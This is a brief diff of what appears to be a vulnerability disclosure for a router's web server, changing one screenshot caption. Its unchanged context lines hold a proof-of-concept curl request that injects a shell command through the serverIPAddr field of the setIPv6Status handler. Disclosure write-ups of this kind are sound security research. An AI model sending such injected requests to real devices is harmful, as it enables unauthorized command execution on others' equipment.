@@ -14,4 +14,4 @@ In the httpd binary, the function `formSetIPv6status` handles requests to `/gofo
 curl -i -X POST http://192.168.0.1/goform/setIPv6Status -d "ipv6Enable=1&ipv6WanType=6in4&serverIPAddr=1.2.3.4;id>/tmp/pwned&localIPAddr=10.0.0.1"
 ```
 
-![Handler accepts injected payload](screenshots/2.png)
+![PoC result](screenshots/2.png)
